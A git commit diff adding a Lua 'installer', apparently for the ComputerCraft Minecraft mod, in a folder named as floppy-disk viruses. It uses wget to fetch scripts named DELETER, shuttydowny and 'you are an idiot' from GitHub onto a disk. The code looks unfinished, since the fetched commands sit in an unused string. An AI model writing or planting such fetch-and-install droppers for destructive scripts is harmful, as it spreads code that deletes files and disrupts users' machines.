b50098a9e9a23a22e2199072fe56ca3acc9e1df4
Fakedrift <127430703+Fakedrift@users.noreply.github.com>
2023-07-13 20:33:50 +0100

    added an installer

---
+++ Virus's (go on floppy disks)/adder.lua
@@ -0,0 +1,6 @@
+local V1F = fs.open("adder.lua")
+local V1S = [[
+    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/DELETER.LUA", "disk/DELETER.lua")
+    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/shuttydowny.lua", "disk/shuttydowny.lua")
+    shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/you%20are%20an%20idiot.lua", "disk/YAAI.lua")
+]] 
